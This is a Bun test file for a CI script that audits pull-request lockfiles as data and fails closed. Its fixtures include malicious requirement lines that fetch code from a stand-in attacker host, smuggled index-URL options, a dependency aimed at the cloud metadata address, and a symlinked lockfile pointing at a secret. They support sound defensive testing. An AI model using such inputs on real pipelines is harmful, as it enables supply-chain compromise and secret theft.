// tests/ci-dep-audit.test.ts — ci/dependency-review/dep-audit.sh audits a PR tree's lockfiles as
// DATA and fails closed (tg-cli#326).
//
// The dependency-review workflow runs the trusted BASE copy of dep-audit.sh under
// pull_request_target against the PR head, so the script must (a) take the tree to audit as an
// argument, (b) never hand pip-audit a requirements line it would have to BUILD (setup.py / PEP 517
// backend = PR code under a privileged trigger), (c) never read the PR's own auditor config
// (bunfig.toml / .npmrc / .cargo/audit.toml can repoint the advisory source or ignore findings),
// and (d) never pass when no audit actually ran or the auditor itself failed (no network).
//
// Every auditor binary is a stub on a private PATH that logs its argv + cwd listing, so the tests
// see exactly what the script would have run; the network test uses the real `bun`.
import { afterEach, describe, expect, test } from 'bun:test';
import { chmodSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'fs';
import { tempDir as runTempDir } from './helpers/test-temp';
import { dirname, join } from 'path';

const SCRIPT = join(import.meta.dir, '..', 'ci', 'dependency-review', 'dep-audit.sh');
const AUDITORS = ['bun', 'npm', 'pnpm', 'yarn', 'pip-audit', 'cargo', 'cargo-audit', 'govulncheck'];

// A real bun.lock (bun 1.4 text format) for a package.json with one devDependency. Written at
// runtime: the repo's .gitignore ignores every `bun.lock` path, so it can't be a fixture file.
const BUN_LOCK = `{
  "lockfileVersion": 2,
  "configVersion": 1,
  "workspaces": {
    "": {
      "name": "fixture",
      "devDependencies": {
        "bun-types": "^1.2.0",
      },
    },
  },
  "packages": {
    "@types/node": ["@types/node@26.6.5", "", { "dependencies": { "undici-types": "~8.9.0" } }, "sha512-uMzsv9stDdofIZBx4UGh4Z9ZgXnGC9seRDscilBcTHAeOFk67MZg/k9bWVfO+bk4qZmG+l52hRnLwUiH2LnJTg=="],

    "bun-types": ["bun-types@1.4.3", "", { "dependencies": { "@types/node": "*", "undici-types": "*" } }, "sha512-tinRJNGOmUN+tEAsn2y2e942n9JHRHR42iUYzDH75NmhJqVBokGSQkkfSFdNWwsANIdrK6ACH9t01M452YyTwg=="],

    "undici-types": ["undici-types@8.11.2", "", {}, "sha512-iMVNmWZ0leK/goS6eXMizSzmm9CDWtyphwbaCms3DNLqRxDL+mMoNVcZMTyyVgXP0N+Z8neAMzDoUOUJL8veKg=="],

    "@types/node/undici-types": ["undici-types@8.9.0", "", {}, "sha512-KTDyRTYX8sWmKXAikPHHSyc63CRPETMctyjKFupcC6OBLXT3xsN0e9aF7m+mIXutFWpUXuedtowG7iLOzp0kQg=="],
  }
}
`;
const PACKAGE_JSON = '{ "name": "fixture", "devDependencies": { "bun-types": "^1.2.0" } }\n';

const cleanups: string[] = [];
afterEach(() => {
  for (const d of cleanups.splice(0)) rmSync(d, { recursive: true, force: true });
});

function tempDir(prefix: string): string {
  const d = runTempDir(prefix);
  cleanups.push(d);
  return d;
}

function writeTree(files: Record<string, string>): string {
  const root = tempDir('dep-audit-tree-');
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(root, rel)), { recursive: true });
    writeFileSync(join(root, rel), body);
  }
  return root;
}

interface Stubs {
  bin: string;
  log: string;
}

// Every auditor on PATH is a logging stub; `overrides` replaces a stub's exit behaviour.
function stubAuditors(overrides: Record<string, string> = {}): Stubs {
  const bin = tempDir('dep-audit-bin-');
  const log = join(bin, 'calls.log');
  writeFileSync(log, '');
  for (const name of AUDITORS) {
    const tail = overrides[name] ?? 'exit 0';
    const body = `#!/bin/sh\n{ printf '%s' "${name}"; for a in "$@"; do printf ' %s' "$a"; done; printf ' | cwd-files:'; ls -A | tr '\\n' ' '; printf '\\n'; } >> "${log}"\n${tail}\n`;
    writeFileSync(join(bin, name), body);
    chmodSync(join(bin, name), 0o755);
  }
  return { bin, log };
}

function calls(stubs: Stubs): string[] {
  return readFileSync(stubs.log, 'utf8').split('\n').filter(Boolean);
}

// Run the script from a neutral cwd so it can only audit the tree it is handed.
function runAudit(tree: string, binDir: string, env: Record<string, string> = {}) {
  const cwd = tempDir('dep-audit-cwd-');
  const proc = Bun.spawnSync(['sh', SCRIPT, tree], {
    cwd,
    env: { PATH: `${binDir}:/usr/bin:/bin`, HOME: cwd, ...env },
    stdout: 'pipe',
    stderr: 'pipe',
  });
  return { exitCode: proc.exitCode, out: proc.stdout.toString() + proc.stderr.toString() };
}

describe('dep-audit.sh — python requirements are audited as data, never built', () => {
  test('a pinned requirements file is audited with pip disabled and no dependency resolution', () => {
    const stubs = stubAuditors();
    const tree = writeTree({ 'requirements.txt': 'requests==2.32.3\nidna[all]==3.7 ; python_version >= "3.8"\n' });
    const r = runAudit(tree, stubs.bin);
    expect(r.out).toContain('pip-audit');
    expect(calls(stubs)).toEqual([expect.stringMatching(/^pip-audit --disable-pip --no-deps -r requirements\.txt \|/)]);
    expect(r.exitCode).toBe(0);
  });

  test('a hashed pinned requirements file (continuation lines) is audited', () => {
    const stubs = stubAuditors();
    const tree = writeTree({
      'requirements.txt':
        '--require-hashes\nrequests==2.32.3 \\\n    --hash=sha256:aaaa \\\n    --hash=sha256:bbbb\nidna==3.7 --hash=sha256:cccc\n',
    });
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([expect.stringMatching(/^pip-audit --disable-pip --no-deps -r requirements\.txt \|/)]);
    expect(r.exitCode).toBe(0);
  });

  // Each of these makes pip(-audit) fetch and BUILD something the PR controls, or read a file the
  // classifier never saw. The line is data: the gate must refuse it without invoking pip-audit.
  const malicious: Record<string, string> = {
    editable: '-e git+https://evil.example/pkg.git#egg=pkg\n',
    'PEP 508 direct URL': 'pkg @ https://evil.example/pkg-1.0.tar.gz\n',
    'local path': './vendored-pkg\n',
    'nested -r include': '-r other.txt\n',
    'constraints include': '-c other.txt\n',
    'foreign index': '--index-url https://evil.example/simple\nrequests==2.32.3\n',
    unpinned: 'requests>=2\n',
    'wildcard pin': 'requests==2.*\n',
    'include smuggled behind a leading hash': '--hash=sha256:aaaa -r other.txt\n',
    'include smuggled after an inline hash': 'requests==2.32.3 --hash=sha256:aaaa -r other.txt\n',
    'option smuggled after a pin': 'requests==2.32.3 --index-url=https://evil.example/simple\n',
    'env-var expansion': 'requests==${EVIL}\n',
  };
  for (const [name, body] of Object.entries(malicious)) {
    test(`refuses a ${name} line without invoking pip-audit`, () => {
      const stubs = stubAuditors();
      const tree = writeTree({ 'requirements.txt': body, 'other.txt': 'evil==1.0\n' });
      const r = runAudit(tree, stubs.bin);
      expect(calls(stubs)).toEqual([]);
      expect(r.out).toContain('requirements.txt');
      expect(r.exitCode).not.toBe(0);
    });
  }

  test('an empty requirements file does not mask an un-auditable pyproject.toml', () => {
    const stubs = stubAuditors();
    const tree = writeTree({ 'requirements.txt': '# nothing pinned\n', 'pyproject.toml': '[project]\nname = "x"\n' });
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([]);
    expect(r.out).toContain('pyproject.toml');
    expect(r.exitCode).not.toBe(0);
  });
});

describe('dep-audit.sh — the PR tree is data, not configuration', () => {
  test("bun audits a staged copy of the lockfile, without the PR's bunfig.toml / .npmrc", () => {
    const stubs = stubAuditors();
    const tree = writeTree({
      'package.json': PACKAGE_JSON,
      'bun.lock': BUN_LOCK,
      'bunfig.toml': '[install]\nregistry = "https://evil.example/"\n',
      '.npmrc': 'registry=https://evil.example/\n',
    });
    const r = runAudit(tree, stubs.bin);
    const log = calls(stubs);
    expect(log).toHaveLength(1);
    expect(log[0]).toMatch(/^bun audit --audit-level=high \| cwd-files:/);
    expect(log[0]).toContain('bun.lock');
    expect(log[0]).not.toContain('bunfig.toml');
    expect(log[0]).not.toContain('.npmrc');
    expect(r.exitCode).toBe(0);
  });

  test('a symlinked lockfile fails closed without running any auditor', () => {
    const stubs = stubAuditors();
    const secret = writeTree({ 'secret.txt': 'TOKEN=hunter2\n' });
    const tree = writeTree({ 'package.json': PACKAGE_JSON });
    symlinkSync(join(secret, 'secret.txt'), join(tree, 'bun.lock'));
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([]);
    expect(r.out).toContain('bun.lock');
    expect(r.out).not.toContain('hunter2');
    expect(r.exitCode).not.toBe(0);
  });

  // The registry-only check is the script's own `bun -e`; run it on the real bun, stub the rest.
  const realBunForEval = { bun: `[ "$1" = -e ] && exec "${process.execPath}" "$@"\nexit 0` };

  test('a package.json with no lockfile is resolved as data (no scripts) and then audited', () => {
    const stubs = stubAuditors(realBunForEval);
    const tree = writeTree({ 'package.json': PACKAGE_JSON });
    const r = runAudit(tree, stubs.bin);
    const log = calls(stubs);
    expect(log).toEqual([
      expect.stringMatching(/^bun -e /),
      expect.stringMatching(/^bun install --lockfile-only --ignore-scripts \|/),
      expect.stringMatching(/^bun audit --audit-level=high \|/),
    ]);
    expect(r.exitCode).toBe(0);
  });

  // Resolving one of these would make the privileged job fetch a PR-chosen location.
  const nonRegistry: Record<string, object> = {
    'git URL': { dependencies: { x: 'git+https://evil.example/x.git' } },
    'tarball URL': { dependencies: { x: 'http://169.254.169.254/latest/meta-data/' } },
    'github shorthand': { devDependencies: { x: 'evil/x' } },
    'file path': { dependencies: { x: 'file:../x' } },
    'npm alias': { dependencies: { x: 'npm:evil@1.0.0' } },
    workspaces: { workspaces: ['packages/*'], dependencies: { x: '^1.0.0' } },
    overrides: { overrides: { x: 'git+https://evil.example/x.git' }, dependencies: { x: '^1.0.0' } },
  };
  for (const [name, pkg] of Object.entries(nonRegistry)) {
    test(`a lockfile-less package.json with a ${name} is refused without resolving it`, () => {
      const stubs = stubAuditors(realBunForEval);
      const tree = writeTree({ 'package.json': JSON.stringify({ name: 'fixture', ...pkg }) });
      const r = runAudit(tree, stubs.bin);
      expect(calls(stubs).filter((c) => !c.startsWith('bun -e '))).toEqual([]);
      expect(r.out).toContain('not a plain registry dependency');
      expect(r.exitCode).not.toBe(0);
    });
  }

  test('a yarn.lock without yarn fails closed instead of falling back to a lockfile-less npm audit', () => {
    const stubs = stubAuditors();
    rmSync(join(stubs.bin, 'yarn'));
    const tree = writeTree({ 'package.json': PACKAGE_JSON, 'yarn.lock': '# yarn lockfile v1\n' });
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([]);
    expect(r.out).toContain('yarn');
    expect(r.exitCode).not.toBe(0);
  });

  // govulncheck loads the packages with the go toolchain — PR `#cgo` flags and `replace`
  // directives would run under the privileged trigger — so a go module can't be audited as data.
  test('a go module fails closed without running govulncheck in the PR tree', () => {
    const stubs = stubAuditors();
    const tree = writeTree({ 'go.mod': 'module example.com/x\n\ngo 1.22\n', 'main.go': 'package main\n' });
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([]);
    expect(r.out).toContain('go.mod');
    expect(r.exitCode).not.toBe(0);
  });

  test('a symlinked requirements/ directory fails closed without running any auditor', () => {
    const stubs = stubAuditors();
    const outside = writeTree({ 'prod.txt': 'requests==2.32.3\n' });
    const tree = writeTree({ 'package.json': PACKAGE_JSON, 'bun.lock': BUN_LOCK });
    symlinkSync(outside, join(tree, 'requirements'));
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([]);
    expect(r.out).toContain('requirements/ is a symlink');
    expect(r.exitCode).not.toBe(0);
  });

  test('a clean audit of one ecosystem does not mask another that could not be audited', () => {
    const stubs = stubAuditors();
    rmSync(join(stubs.bin, 'cargo'));
    rmSync(join(stubs.bin, 'cargo-audit'));
    const tree = writeTree({ 'package.json': PACKAGE_JSON, 'bun.lock': BUN_LOCK, 'Cargo.lock': 'version = 3\n' });
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toEqual([expect.stringMatching(/^bun audit /)]);
    expect(r.out).toContain('Cargo.lock');
    expect(r.exitCode).not.toBe(0);
  });

  test('DEP_AUDIT_ALLOW_MISSING=1 skips an un-auditable manifest on purpose', () => {
    const stubs = stubAuditors();
    rmSync(join(stubs.bin, 'yarn'));
    const tree = writeTree({ 'package.json': PACKAGE_JSON, 'yarn.lock': '# yarn lockfile v1\n' });
    const r = runAudit(tree, stubs.bin, { DEP_AUDIT_ALLOW_MISSING: '1' });
    expect(calls(stubs)).toEqual([]);
    expect(r.out).toContain('skipping (DEP_AUDIT_ALLOW_MISSING=1)');
    expect(r.exitCode).toBe(0);
  });

  test('a missing audit dir fails closed', () => {
    const stubs = stubAuditors();
    const r = runAudit(join(tempDir('dep-audit-gone-'), 'nope'), stubs.bin);
    expect(calls(stubs)).toEqual([]);
    expect(r.exitCode).not.toBe(0);
  });
});

describe('dep-audit.sh — an audit that could not reach its advisory database fails closed', () => {
  test('real bun audit against an unreachable registry fails the gate', () => {
    const bin = tempDir('dep-audit-realbun-');
    symlinkSync(process.execPath, join(bin, 'bun'));
    const tree = writeTree({ 'package.json': PACKAGE_JSON, 'bun.lock': BUN_LOCK });
    const r = runAudit(tree, bin, {
      BUN_CONFIG_REGISTRY: 'http://127.0.0.1:9/',
      NPM_CONFIG_REGISTRY: 'http://127.0.0.1:9/',
    });
    expect(r.out).toMatch(/bun audit/);
    expect(r.out).toMatch(/FAIL/);
    expect(r.exitCode).not.toBe(0);
  });

  test('a pip-audit network error fails the gate and is not reported as a pass', () => {
    const stubs = stubAuditors({ 'pip-audit': 'echo "ConnectionError: osv.dev unreachable" >&2; exit 1' });
    const tree = writeTree({ 'requirements.txt': 'requests==2.32.3\n' });
    const r = runAudit(tree, stubs.bin);
    expect(calls(stubs)).toHaveLength(1);
    expect(r.out).not.toContain('PASS');
    expect(r.exitCode).not.toBe(0);
  });
});
